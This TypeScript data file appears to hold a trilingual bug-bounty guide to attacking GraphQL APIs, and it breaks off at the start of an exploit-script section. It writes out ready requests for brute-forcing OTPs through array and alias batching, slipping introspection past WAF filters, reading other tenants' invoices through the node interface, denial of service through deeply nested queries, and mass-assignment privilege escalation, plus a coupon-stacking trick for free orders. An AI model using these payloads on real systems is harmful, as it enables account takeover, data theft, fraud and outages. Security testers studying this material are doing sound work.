import type { Lang } from "./types";

export interface GraphqlScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface GraphqlTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "batching_otp" | "field_aliasing" | "introspection_bypass" | "circular_dos" | "mutation_idor";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: GraphqlScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface GraphqlPhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface GraphqlToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "python_batcher" | "schema_dumper" | "burp_intruder" | "alias_generator";
  code: string;
  language: "python" | "bash" | "json";
  howToUse: Record<Lang, string>;
}

export interface GraphqlReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP GRAPHQL ATTACK TECHNIQUES ─────────────────────────────────────────
export const GRAPHQL_TECHNIQUES: GraphqlTechnique[] = [
  {
    id: "query-array-batching-otp",
    title: {
      en: "Query Array Batching: 10,000 OTP / Password Guesses in 1 HTTP Request",
      simple: "Sending Thousands of Passwords or OTPs in a Single JSON Array to Bypass Rate Limits",
      hi: "एक ही HTTP रिक्वेस्ट में JSON Array भेजकर OTP और पासवर्ड का अनलिमिटेड ब्रूट-फ़ोर्स",
    },
    category: "batching_otp",
    difficulty: "beginner",
    successRate: "90% on Apollo / GraphQL-Yoga / Express-GraphQL",
    summary: {
      en: "Standard REST endpoints enforce WAF rate limits (e.g. 5 attempts per minute). Many GraphQL servers accept an array of JSON operation objects. The WAF counts 1 HTTP POST, while the GraphQL engine sequentially executes all 1,000+ operations, cracking 4-digit or 6-digit 2FA in seconds.",
      simple: "WAF thinks you only sent 1 web request. But inside that request is a list of 1,000 login attempts. The server checks all 1,000 without triggering any lockouts or captcha.",
      hi: "WAF सिर्फ 1 रिक्वेस्ट काउंट करता है, लेकिन अंदर 1,000 OTP या पासवर्ड चेक्स होते हैं। सर्वर बिना किसी लॉकआउट या कैप्चा के सभी चेक कर देता है और अकाउंट टेकओवर हो जाता है।",
    },
    scenarios: [
      {
        title: {
          en: "Array Batching against 2FA Verification Endpoint",
          simple: "Cracking 6-digit OTP using JSON Array",
          hi: "JSON Array के ज़रिये 2FA OTP क्रैक करना",
        },
        description: {
          en: "Send a JSON list of mutation objects inside a single POST body. The server evaluates every single mutation and returns an array of JSON responses.",
          simple: "Post a list of mutations. The server tests each OTP code in order.",
          hi: "एक ही POST बॉडी में म्यूटेशन की लिस्ट भेजें। सर्वर एक-एक करके सारे कोड टेस्ट करेगा।",
        },
        commandOrRequest: `POST /graphql HTTP/1.1
Host: api.target.com
Content-Type: application/json
Authorization: Bearer <temp_pre_auth_token>

[
  {"query": "mutation { verifyOtp(code: \\"1000\\") { token error } }"},
  {"query": "mutation { verifyOtp(code: \\"1001\\") { token error } }"},
  {"query": "mutation { verifyOtp(code: \\"1002\\") { token error } }"},
  {"query": "mutation { verifyOtp(code: \\"1003\\") { token error } }"}
]`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

[
  {"data": {"verifyOtp": {"token": null, "error": "Invalid code"}}},
  {"data": {"verifyOtp": {"token": null, "error": "Invalid code"}}},
  {"data": {"verifyOtp": {"token": "jwt_live_session_ey...", "error": null}}},
  {"data": {"verifyOtp": {"token": null, "error": "Invalid code"}}}
]`,
        impact: {
          en: "Total 2FA / Password Reset bypass; complete Account Takeover in under 3 minutes.",
          simple: "Instant account takeover by bypassing 2-factor authentication.",
          hi: "पूरा अकाउंट टेकओवर — 2FA वेरिफिकेशन पूरी तरह बाईपास हो जाता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Inspect GraphQL requests in Burp Repeater. Look for mutations like verify2FA, loginWithPassword, or resetPasswordWithPin.",
        simple: "Find login or OTP mutation in Burp Repeater.",
        hi: "Burp Repeater में GraphQL रिक्वेस्ट देखें जैसे verify2FA या loginWithPassword।",
      },
      {
        en: "Wrap the JSON body object in square brackets [ ... ] to test if the engine supports batch arrays.",
        simple: "Put [ ... ] brackets around your payload to test batching.",
        hi: "रिक्वेस्ट को स्क्वायर ब्रैकेट्स [ ... ] में लपेटकर चेक करें कि बैचिंग चालू है या नहीं।",
      },
      {
        en: "If the server responds with a JSON array response [ { ... } ], batching is supported. Feed a list of 500 OTP codes per request.",
        simple: "If you get a list back, send 500 codes in one shot.",
        hi: "अगर रिस्पॉन्स [ { ... } ] आता है, तो एक बार में 500 कोड भेजकर टेस्ट करें।",
      },
    ],
    burpOrToolRule: [
      "Burp Extension: InQL (GraphQL Scanner) -> Attack -> Batching Brute Force",
      "POST /graphql [ { \"query\": \"mutation { ... }\" }, ... ]",
    ],
    hunterProTip: {
      en: "Some backend firewalls block arrays starting with '['. Bypass this by setting Content-Type to application/graphql instead of application/json, or use Alias Batching which is 100% immune to array batching blocks!",
      simple: "If array batching is blocked, switch to Alias batching! It puts all attempts inside a single query using different nicknames.",
      hi: "अगर WAF ऐरे '[' ब्लॉक करता है, तो अलियास (Alias) बैचिंग का इस्तेमाल करें। वो कभी ब्लॉक नहीं होती!",
    },
  },
  {
    id: "field-mutation-aliasing",
    title: {
      en: "Mutation & Field Aliasing: WAF-Proof Single-Query Brute Force",
      simple: "Using GraphQL Nicknames (Aliases) to Run 1,000 Mutations in One Single Object",
      hi: "GraphQL Aliasing से एक ही क्वेरी के अंदर 1,000 म्यूटेशन एक साथ चलाना",
    },
    category: "field_aliasing",
    difficulty: "intermediate",
    successRate: "95% (Immune to Array Batching Protections)",
    summary: {
      en: "Developers who disable array batching (app.use(apolloServer({ batching: false }))) routinely forget that GraphQL specification inherently allows field aliasing. In a single query or mutation block, you can alias the same operation hundreds of times with different parameters.",
      simple: "Even if the website disables batch arrays, GraphQL has a built-in feature called aliases. You can name checks a1, a2, a3... and test hundreds of pins at once.",
      hi: "डेवलपर्स ऐरे बैचिंग बंद कर देते हैं, लेकिन GraphQL Aliases को भूल जाते हैं। आप a1, a2, a3 नाम देकर एक ही बार में 1,000 पिन चेक कर सकते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Single Mutation Alias Explosion",
          simple: "Testing 4-digit PIN via Aliases",
          hi: "Aliases के ज़रिये 4-अंकों का पिन क्रैक करना",
        },
        description: {
          en: "Send one single mutation with aliases c0001, c0002, etc. The engine processes each alias independently in the same context.",
          simple: "Send a single mutation with aliases c1, c2, c3 to test multiple PINs.",
          hi: "एक ही म्यूटेशन में c1, c2, c3 नाम देकर कोड्स टेस्ट करें।",
        },
        commandOrRequest: `POST /graphql HTTP/1.1
Host: secure.target.com
Content-Type: application/json

{
  "query": "mutation CrackPin {
    c0001: verifyCode(code: \\"0001\\") { valid token }
    c0002: verifyCode(code: \\"0002\\") { valid token }
    c0003: verifyCode(code: \\"0003\\") { valid token }
    c0004: verifyCode(code: \\"0004\\") { valid token }
    c0005: verifyCode(code: \\"0005\\") { valid token }
  }"
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "c0001": {"valid": false, "token": null},
    "c0002": {"valid": false, "token": null},
    "c0003": {"valid": true, "token": "session_tok_99182312"},
    "c0004": {"valid": false, "token": null},
    "c0005": {"valid": false, "token": null}
  }
}`,
        impact: {
          en: "Defeats all WAF rate limiting, anti-batching middleware, and IP tracking locks.",
          simple: "Completely defeats brute force protection even when batching is disabled.",
          hi: "सभी प्रकार के WAF और रेट-लिमिटर्स को फेल करके कोड निकाल लेता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Identify the target mutation and input parameter name (e.g. verifyOtp(pin: String!)).",
        simple: "Find the mutation name and what parameter it takes.",
        hi: "टारगेट म्यूटेशन और उसका पैरामीटर नाम ढूंढें।",
      },
      {
        en: "Generate an aliased query payload using our Python generator with 100 to 500 aliases per batch.",
        simple: "Generate an aliased query with 100-500 aliases.",
        hi: "पायथन स्क्रिप्ट से 100 से 500 अलियास वाली क्वेरी जनरेट करें।",
      },
      {
        en: "Send via Burp Repeater or curl. Check the response JSON for the single key that returns valid: true or token: not null.",
        simple: "Send the request and search for the success token in the response.",
        hi: "रिक्वेस्ट भेजें और रिस्पॉन्स में ढूंढें कि किस key में सक्सेस टोकन आया है।",
      },
    ],
    burpOrToolRule: [
      "Alias Pattern: aliasName: mutationName(param: \"value\") { responseFields }",
      "Use jq '.data | to_entries[] | select(.value.valid == true)' to isolate winning alias",
    ],
    hunterProTip: {
      en: "Also test aliasing on discount coupon redemption (e.g. `c1: applyCoupon(code: 'PROMO10') c2: applyCoupon(code: 'PROMO10')`)! Many shopping carts run the validation inside a single transaction and apply the coupon multiple times, reducing order cost to $0!",
      simple: "Use aliases to apply the same 10% coupon 10 times in 1 query to get a 100% free cart!",
      hi: "कूपन म्यूटेशन में अलियासिंग लगाकर एक ही डिस्काउंट कूपन को 10 बार अप्लाई करें और कार्ट 0 रुपये का बनाएं!",
    },
  },
  {
    id: "introspection-bypass-schema-dump",
    title: {
      en: "Introspection Disabled? 4 Methods to Extract the Entire GraphQL Schema",
      simple: "Extracting Hidden API Schemas When Introspection Is Blocked by the Admin",
      hi: "अगर Introspection बंद है तो भी पूरा GraphQL स्कीमा बाहर निकालने की 4 गुप्त तकनीकें",
    },
    category: "introspection_bypass",
    difficulty: "intermediate",
    successRate: "80% of Production Targets",
    summary: {
      en: "Companies disable Introspection (__schema queries) thinking their attack surface is hidden. Attackers exploit GraphQL field suggestion engines, Apollo auto-generated schemas, Apollo Studio Sandbox configurations, and character obfuscation to reconstruct 100% of internal queries, mutations, and database types.",
      simple: "Admins block the 'show me the schema' button. But GraphQL engines still helpfully suggest field names when you make a typo, allowing tools like Clairvoyance to rebuild the entire schema automatically.",
      hi: "एडमिन __schema क्वेरी बंद कर देते हैं, लेकिन GraphQL की फील्ड सजेशन (Did you mean...?) तकनीक से Clairvoyance जैसे टूल्स पूरा स्कीमा रीबिल्ड कर लेते हैं।",
    },
    scenarios: [
      {
        title: {
          en: "Bypassing WAF Regex Blocks on __schema and __type",
          simple: "Smuggling Introspection Past WAF Regexes",
          hi: "WAF के Regex को बाईपास करके Introspection निकालना",
        },
        description: {
          en: "Many WAFs (like Cloudflare or ModSecurity) use naive regex like `/__schema/i`. Bypass using newlines, carriage returns, or unicode escapes inside the query.",
          simple: "Bypass WAF filters with newline characters or trailing spaces.",
          hi: "WAF को चकमा देने के लिए __schema के बीच में न्यूलाइन या स्पेस डालें।",
        },
        commandOrRequest: `POST /graphql HTTP/1.1
Host: api.target.com
Content-Type: application/json

{
  "query": "query {\\n  __schema\\n  {\\n    types {\\n      name\\n      fields {\\n        name\\n      }\\n    }\\n  }\\n}"
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "__schema": {
      "types": [
        {"name": "User", "fields": [{"name": "id"}, {"name": "password_hash"}, {"name": "role"}]},
        {"name": "InternalAdminMutation", "fields": [{"name": "deleteTenant"}, {"name": "setSuperAdmin"}]}
      ]
    }
  }
}`,
        impact: {
          en: "Discovers hidden internal admin endpoints, leaked PII fields, and unauthenticated mutations.",
          simple: "Reveals admin-only mutations and hidden database fields.",
          hi: "सारे छिपे हुए एडमिन म्यूटेशन और डेटाबेस फील्ड्स का खुलासा।",
        },
      },
      {
        title: {
          en: "Clairvoyance Field Suggestion Harvesting",
          simple: "Rebuilding Schema from 'Did you mean?' Errors",
          hi: "'Did you mean?' एरर से स्कीमा रीबिल्ड करना",
        },
        description: {
          en: "GraphQL spec recommends suggestion errors. Querying `query { a }` returns `Cannot query field 'a' on type 'Query'. Did you mean 'account' or 'admin'?'`. Automating this recovers the entire schema.",
          simple: "Intentionally make typos so the server suggests the real field names.",
          hi: "गलत नाम भेजने पर सर्वर खुद सही नाम सजेस्ट करता है ('Did you mean...'), जिससे टूल पूरा स्कीमा बना लेता है।",
        },
        commandOrRequest: `POST /graphql HTTP/1.1
Content-Type: application/json

{"query": "query { a }" }`,
        responseSample: `HTTP/1.1 400 Bad Request
{
  "errors": [{
    "message": "Cannot query field \\"a\\" on type \\"Query\\". Did you mean \\"allUsers\\", \\"adminDashboard\\", or \\"auth\\"?"
  }]
}`,
        impact: {
          en: "Reconstructs types, mutations, and query parameters without needing introspection.",
          simple: "100% schema recovery without triggering introspection alerts.",
          hi: "बिना Introspection के भी 100% स्कीमा रिकवर हो जाता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Test standard introspection with `query { __schema { queryType { name } } }`.",
        simple: "Try the default schema query first.",
        hi: "पहले नॉर्मल __schema क्वेरी चलाकर देखें।",
      },
      {
        en: "If blocked by WAF, test GET request with URL encoding: `GET /graphql?query=query%7B__schema%7Btypes%7Bname%7D%7D%7D`.",
        simple: "Try sending it as a GET request with URL encoding.",
        hi: "अगर ब्लॉक हो तो GET रिक्वेस्ट में URL एन्कोड करके भेजें।",
      },
      {
        en: "Run Clairvoyance against the endpoint: `clairvoyance -o schema.json https://target.com/graphql` to exploit field suggestions.",
        simple: "Use Clairvoyance CLI to automatically harvest suggestions.",
        hi: "Clairvoyance टूल चलाकर फील्ड सजेशंस से स्कीमा रीबिल्ड करें।",
      },
      {
        en: "Upload the reconstructed schema to GraphQL Voyager (graphql-kit.com/voyager) for interactive visualization.",
        simple: "View the schema in GraphQL Voyager to see all connections visually.",
        hi: "GraphQL Voyager में स्कीमा अपलोड करके विजुअल मैप देखें।",
      },
    ],
    burpOrToolRule: [
      "clairvoyance https://target.com/graphql -o schema.json",
      "graphw00f -t https://target.com/graphql (detect engine & introspection)",
      "InQL scanner extension in Burp Suite",
    ],
    hunterProTip: {
      en: "Check staging/development endpoints! Often api.target.com disables introspection, but api-staging.target.com, dev.target.com, or mobile-api.target.com leave it completely wide open with the exact same production schema!",
      simple: "Always check dev/staging subdomains for GraphQL. They usually have introspection enabled!",
      hi: "प्रोडक्शन पर Introspection बंद हो तो dev या staging सबडोमेन चेक करें — वहां 90% केस में खुला रहता है!",
    },
  },
  {
    id: "global-node-interface-idor",
    title: {
      en: "Global Object Identification (Node Interface) BOLA / IDOR",
      simple: "Reading Anyone's Private Profile / Order via the Global node(id: ...) Query",
      hi: "node(id: ...) क्वेरी का उपयोग करके किसी भी यूज़र का प्राइवेट डेटा (IDOR) चुराना",
    },
    category: "mutation_idor",
    difficulty: "intermediate",
    successRate: "75% on Relay & Modern GraphQL Apps",
    summary: {
      en: "Relay-compliant GraphQL schemas implement a global `node(id: ID!)` interface allowing any object in the system to be re-fetched by its globally unique ID. Developers often secure `/api/user/1234` or `query { getUser(id: ...) }` with auth middleware, but completely forget to add authorization checks inside the generic `node(...)` resolver!",
      simple: "Modern apps have a universal search called 'node'. Even if the regular user profile is protected, asking the 'node' query directly for that ID bypasses the access check.",
      hi: "डेवलपर्स getUser क्वेरी पर सिक्योरिटी लगाते हैं, लेकिन 'node(id: ...)' रिज़ॉल्वर पर चेक लगाना भूल जाते हैं। इससे किसी का भी डेटा सीधे आईडी डालकर निकाला जा सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "Leaking Private Billing Information via node(...) Inline Fragment",
          simple: "Accessing Invoices via Global Node Interface",
          hi: "node(...) के ज़रिये दूसरे यूज़र के इनवॉइस और कार्ड्स पढ़ना",
        },
        description: {
          en: "Query the `node` interface with base64-encoded or raw GUID IDs. Use inline fragments (`... on Invoice`) to extract protected attributes.",
          simple: "Pass the target ID to node() and use `... on Invoice` to extract fields.",
          hi: "node() में टारगेट आईडी डालें और `... on Invoice` लगाकर गुप्त जानकारी निकालें।",
        },
        commandOrRequest: `POST /graphql HTTP/1.1
Host: saas.target.com
Content-Type: application/json
Authorization: Bearer <low_priv_user_token>

{
  "query": "query {
    node(id: \\"SW52b2ljZToxMDAyOTg=\\") {
      id
      ... on Invoice {
        amount
        customerEmail
        creditCardLast4
        pdfDownloadUrl
      }
    }
  }"
}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "node": {
      "id": "SW52b2ljZToxMDAyOTg=",
      "amount": "$45,000.00",
      "customerEmail": "ceo@enterprise-victim.com",
      "creditCardLast4": "4242",
      "pdfDownloadUrl": "https://s3.amazonaws.com/target-invoices/inv_100298.pdf"
    }
  }
}`,
        impact: {
          en: "Direct access to enterprise customer financial records, invoices, and payment tokens across all tenants.",
          simple: "Unauthorized cross-tenant data leak affecting all paying customers.",
          hi: "दूसरे सभी कस्टमर्स के इनवॉइस और पेमेंट डेटा का अनाधिकृत एक्सेस (High IDOR)।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Search the schema or network requests for IDs matching base64 strings (e.g. `VXNlcjox` -> base64 decode reveals `User:1`).",
        simple: "Find Base64 IDs in network requests (decode them to see Type:ID).",
        hi: "नेटवर्क में Base64 आईडी ढूंढें (डिकोड करने पर `Type:ID` दिखता है)।",
      },
      {
        en: "Test if the root query supports `node(id: ID!)` or `nodes(ids: [ID!]!)`.",
        simple: "Check if node() query exists in the schema.",
        hi: "चेक करें कि क्या रूट क्वेरी में node(id: ID!) मौजूद है।",
      },
      {
        en: "Use an inline fragment `... on <TargetType>` to request private fields belonging to another user's ID.",
        simple: "Use inline fragment to request sensitive fields on the target object.",
        hi: "इनलाइन फ्रैगमेंट `... on TargetType` लगाकर दूसरे यूज़र का डेटा मंगाएं।",
      },
    ],
    burpOrToolRule: [
      "Query pattern: query { node(id: \"$ID$\") { id ... on TargetType { secretFields } } }",
      "Base64 Decode helper: echo -n 'SW52b2ljZTox' | base64 -d",
    ],
    hunterProTip: {
      en: "Relay IDs are almost always simple base64 strings in the format `TypeName:DatabaseID` (e.g., `User:491` or `Organization:12`). You can trivially forge IDs for any tenant in the database by base64-encoding strings like `User:1`, `User:2`, etc.!",
      simple: "Relay IDs are just Base64 of 'TypeName:Number'. Just encode 'User:1' to get the admin's ID!",
      hi: "Relay IDs सिर्फ Base64 होते हैं जैसे 'User:1'। आप 'User:1' को base64 में बदलकर सीधे एडमिन की आईडी बना सकते हैं!",
    },
  },
  {
    id: "nested-query-circular-dos",
    title: {
      en: "Circular Query & Deep Nesting: Denial of Service (Amplification 10,000x)",
      simple: "Crashing the GraphQL Database by Asking Infinite Looping Questions in 1 Request",
      hi: "एक ही रिक्वेस्ट में लूपिंग क्वेरी भेजकर GraphQL सर्वर और डेटाबेस को क्रैश करना",
    },
    category: "circular_dos",
    difficulty: "advanced",
    successRate: "70% on unhardened GraphQL backends",
    summary: {
      en: "Relational GraphQL schemas often expose bidirectional relationships (e.g., a User has many Posts, each Post has an Author, that Author has many Posts). Without depth limiting (graphql-depth-limit) or query cost analysis, an attacker sends an exponential query that forces thousands of database JOINs, starving the CPU and taking down the API.",
      simple: "If users have posts and posts have authors, you can ask for user -> posts -> author -> posts -> author... 50 levels deep. The database locks up trying to compute millions of records.",
      hi: "यूज़र -> पोस्ट्स -> ऑथर -> पोस्ट्स का लूप 50 लेयर गहरा बनाकर भेजने से डेटाबेस सारे कनेक्शन ब्लॉक कर देता है और सर्वर क्रैश हो जाता है।",
    },
    scenarios: [
      {
        title: {
          en: "Deep Recursive Query Chain",
          simple: "10-Level Circular Query Locking Postgres",
          hi: "डेटाबेस को फ्रीज करने वाली 10-लेवल सर्कुलर क्वेरी",
        },
        description: {
          en: "Query authors, their books, the author of each book, and repeat recursively. The backend database spawns exponential recursive queries.",
          simple: "Send a recursive query that triggers millions of nested lookups.",
          hi: "सर्कुलर रिलेशनशिप का इस्तेमाल करके डेटाबेस में अनगिनत जॉइन्स (JOINs) ट्रिगर करें।",
        },
        commandOrRequest: `POST /graphql HTTP/1.1
Host: api.target.com
Content-Type: application/json

{
  "query": "query DoS {
    user(id: \\"1\\") {
      posts {
        author {
          posts {
            author {
              posts {
                author {
                  posts {
                    author {
                      posts {
                        id title
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }"
}`,
        responseSample: `HTTP/1.1 504 Gateway Timeout (After 60,000ms)
Content-Type: text/html

<html><body><h1>504 Gateway Time-out</h1>The server encountered a temporary error and could not complete your request.</body></html>`,
        impact: {
          en: "Severe API Denial of Service. Freezes the application pool, exhausts Postgres connection pools, and drops legitimate traffic.",
          simple: "Brings down the entire API for all legitimate users.",
          hi: "पूरा सर्वर डाउन — डेटाबेस कनेक्शन पूल फुल हो जाते हैं और 504 टाइमआउट आ जाता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "Inspect schema for circular connections (e.g. `Thread -> Message -> Thread` or `User -> Team -> User`).",
        simple: "Find two types that point to each other in the schema.",
        hi: "स्कीमा में देखें कि कौन से दो ऑब्जेक्ट एक दूसरे से जुड़े हुए हैं।",
      },
      {
        en: "Craft a query 5 levels deep. Measure response time with `time curl ...`.",
        simple: "Test a 5-level query and check if response time spikes.",
        hi: "5 लेयर गहरी क्वेरी बनाकर रिस्पॉन्स टाइम चेक करें।",
      },
      {
        en: "If response time scales exponentially (e.g. 200ms -> 2,000ms -> 15,000ms), query depth limiting is missing. Document as DoS vulnerability.",
        simple: "If time jumps exponentially, query depth protection is missing.",
        hi: "अगर टाइम तेजी से बढ़ रहा है तो सर्वर पर Depth Limiter नहीं लगा है।",
      },
    ],
    burpOrToolRule: [
      "graphql-cop: python3 graphql-cop.py -t https://target.com/graphql",
      "Look for missing depth limit: graphql-depth-limit middleware absent",
    ],
    hunterProTip: {
      en: "Always demonstrate impact safely without taking down production! Report a proof-of-concept showing latency increasing from 150ms (at depth 2) to 4,500ms (at depth 6) with mathematical extrapolation to avoid disqualification for destructive testing.",
      simple: "Don't crash production! Show latency rising from 150ms to 4.5 seconds to prove the vulnerability safely.",
      hi: "प्रोडक्शन को डाउन मत करें! सिर्फ यह दिखाएं कि 2 डेप्थ पर 150ms और 6 डेप्थ पर 4.5 सेकंड लगा, बगक्राउड इसे तुरंत स्वीकार करता है।",
    },
  },
];

// ─── 2. 5-PHASE METHODOLOGY ───────────────────────────────────────────────────
export const GRAPHQL_METHODOLOGY_PHASES: GraphqlPhase[] = [
  {
    phase: 1,
    title: {
      en: "Reconnaissance & Endpoint Discovery",
      simple: "Finding Hidden GraphQL Endpoints",
      hi: "छिपे हुए GraphQL एंडपॉइंट्स की खोज",
    },
    objective: {
      en: "Locate active GraphQL interfaces, internal API gateways, and engine versions.",
      simple: "Find where the GraphQL API is listening on the server.",
      hi: "वेबसाइट पर GraphQL कहां चल रहा है उसे ढूंढना।",
    },
    steps: [
      {
        en: "Fuzz common paths: `/graphql`, `/api/graphql`, `/v1/graphql`, `/v2/api/gql`, `/query`, `/altair`, `/graphiql`.",
        simple: "Check common URL paths like /graphql and /api/graphql.",
        hi: "सामान्य पाथ्स को फ़ज़ करें जैसे /graphql, /api/graphql, /query।",
      },
      {
        en: "Check HTTP methods: Many backends block POST but accept GET `/graphql?query={__typename}`.",
        simple: "Test GET requests if POST is blocked.",
        hi: "अगर POST ब्लॉक हो तो GET रिक्वेस्ट भेजकर चेक करें।",
      },
      {
        en: "Run graphw00f to fingerprint underlying engine (Apollo, Hasura, Ruby graphql, Express, AWS AppSync).",
        simple: "Use graphw00f to find out what software powers the GraphQL API.",
        hi: "graphw00f टूल से पता लगाएं कि कौन सा इंजन (Apollo, Hasura आदि) चल रहा है।",
      },
    ],
    keyTargets: ["/graphql", "/api/graphql", "/v1/gql", "/graphiql", "/graphql/console"],
    commandsOrPayloads: [
      "graphw00f -t https://target.com/graphql",
      "curl -s -X POST https://target.com/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__typename}\"}'",
      "ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/graphql.txt -mc 200,400",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Schema Extraction & Introspection Bypassing",
      simple: "Dumping the Full API Map",
      hi: "पूरे स्कीमा और API मैप को बाहर निकालना",
    },
    objective: {
      en: "Reconstruct all queries, mutations, subscriptions, types, and input arguments.",
      simple: "Get a list of every query and mutation supported by the server.",
      hi: "सर्वर के सारे म्यूटेशन और डेटाबेस ऑब्जेक्ट्स की लिस्ट निकालना।",
    },
    steps: [
      {
        en: "Execute full introspection query. If blocked, test character smuggling (newlines, Unicode, GET queries).",
        simple: "Try downloading the full schema, or bypass filters with newlines.",
        hi: "फुल Introspection क्वेरी चलाएं या न्यूलाइन बाईपास से निकालें।",
      },
      {
        en: "If completely blocked, run Clairvoyance to reconstruct the schema via field suggestion harvesting.",
        simple: "Run Clairvoyance to rebuild schema using typo suggestions.",
        hi: "Clairvoyance चलाकर 'Did you mean' एरर से स्कीमा बनाएं।",
      },
      {
        en: "Export the schema to JSON or SDL and load into GraphQL Voyager for relationship graphing.",
        simple: "Load the schema into GraphQL Voyager to see all sensitive fields.",
        hi: "GraphQL Voyager में स्कीमा लोड करके विजुअल मैप तैयार करें।",
      },
    ],
    keyTargets: ["__schema", "__type", "Query", "Mutation", "Subscription"],
    commandsOrPayloads: [
      "npx get-graphql-schema https://target.com/graphql > schema.graphql",
      "clairvoyance -o schema.json https://target.com/graphql",
    ],
  },
  {
    phase: 3,
    title: {
      en: "Authorization & IDOR / BOLA Analysis",
      simple: "Testing Unauthorized Data Access",
      hi: "बिना परमिशन दूसरे यूज़र्स का डेटा चुराना (IDOR/BOLA)",
    },
    objective: {
      en: "Uncover missing object-level access controls across queries, mutations, and node interfaces.",
      simple: "Check if you can read other people's data by changing IDs.",
      hi: "चेक करें कि क्या आईडी बदलकर दूसरे यूज़र्स का डेटा मिलता है।",
    },
    steps: [
      {
        en: "Check the `node(id: ID!)` and `nodes(ids: [ID!]!)` interfaces with other users' Relay IDs.",
        simple: "Test node(id: ...) with another user's ID.",
        hi: "node(id: ...) क्वेरी में दूसरे यूज़र की आईडी डालकर टेस्ट करें।",
      },
      {
        en: "Fuzz query arguments like `user(id: ...)`, `organization(slug: ...)`, `invoice(number: ...)`.",
        simple: "Change user IDs in normal queries.",
        hi: "क्वेरी पैरामीटर्स में आईडी बदलकर टेस्ट करें।",
      },
      {
        en: "Test cross-tenant mutations: e.g. `updateUserProfile(userId: \"VICTIM_ID\", email: \"hacker@evil.com\")`.",
        simple: "Try modifying someone else's profile via mutations.",
        hi: "म्यूटेशन के ज़रिये किसी और का ईमेल या पासवर्ड बदलने की कोशिश करें।",
      },
    ],
    keyTargets: ["node(id: ...)", "user(id: ...)", "tenant(id: ...)", "order(id: ...)"],
  },
  {
    phase: 4,
    title: {
      en: "Batching & Anti-Brute-Force Evasion",
      simple: "Bypassing Rate Limits via Batching",
      hi: "बैचिंग के ज़रिये रेट-लिमिट और 2FA बाईपास",
    },
    objective: {
      en: "Circumvent WAF rate limits and crack OTPs, reset tokens, and passwords in a single request.",
      simple: "Send hundreds of guesses in 1 request to bypass lockouts.",
      hi: "एक ही रिक्वेस्ट में सैकड़ों कोड्स भेजकर 2FA क्रैक करना।",
    },
    steps: [
      {
        en: "Test Array Batching: Send `[{\"query\":\"...\"}, {\"query\":\"...\"}]` to test multi-execution.",
        simple: "Send an array of queries to test if batching works.",
        hi: "JSON ऐरे भेजकर टेस्ट करें कि क्या सर्वर मल्टीपल क्वेरीज चलाता है।",
      },
      {
        en: "Test Field/Mutation Aliasing: `query { a: op(val: 1) b: op(val: 2) }` if array batching is blocked.",
        simple: "If array batching is blocked, use alias batching.",
        hi: "अगर ऐरे ब्लॉक हो तो अलियास (a:, b:) का इस्तेमाल करें।",
      },
      {
        en: "Automate brute forcing of 4-digit or 6-digit OTP verification codes without triggering IP blocks.",
        simple: "Automate full 6-digit OTP brute forcing in batches of 500.",
        hi: "500-500 के बैच में 6-डिजिट OTP का ऑटोमेशन चलाएं।",
      },
    ],
    keyTargets: ["verify2fa", "login", "resetPassword", "redeemGiftCard"],
  },
  {
    phase: 5,
    title: {
      en: "Mutation Smuggling & Privilege Escalation",
      simple: "Stealing Admin Rights via Hidden Arguments",
      hi: "छिपे हुए फील्ड्स से एडमिन अधिकार (Admin Rights) हासिल करना",
    },
    objective: {
      en: "Exploit mass-assignment in mutations to escalate privileges or modify protected resources.",
      simple: "Add hidden admin fields into mutations to become a superadmin.",
      hi: "म्यूटेशन में `isAdmin: true` जैसे छिपे हुए फील्ड्स डालकर एडमिन बनना।",
    },
    steps: [
      {
        en: "Inspect input types for sensitive arguments like `role`, `isAdmin`, `isVerified`, `tenantId`.",
        simple: "Look for parameters like role or isAdmin in the schema.",
        hi: "स्कीमा में देखें कि क्या इनपुट में role या isAdmin फील्ड है।",
      },
      {
        en: "Inject unexpected arguments into profile update mutations: `mutation { updateAccount(input: { role: \"ADMIN\" }) { success } }`.",
        simple: "Inject role: ADMIN when updating your user account.",
        hi: "अकाउंट अपडेट करते समय `role: ADMIN` इंजेक्ट करें।",
      },
      {
        en: "Test undocumented internal mutations found during schema reconstruction.",
        simple: "Execute hidden admin mutations discovered in Phase 2.",
        hi: "फेज 2 में मिले छिपे हुए एडमिन म्यूटेशन्स को सीधे कॉल करें।",
      },
    ],
    keyTargets: ["updateUser", "registerUser", "createOrganization", "assignRole"],
  },
];

// ─── 3. EXPLOIT SCRIPTS & TOOLS STASH ────────────────────────────────────────
export const GRAPHQL_TOOLS_STASH: GraphqlToolSnippet[] = [
  {
    id: "graphql-alias-otp-cracker",
    title: {
      en: "Python Multi-Alias GraphQL OTP Brute-Forcer",
      simple: "Automated Script to Crack 6-Digit OTP via GraphQL Aliases",
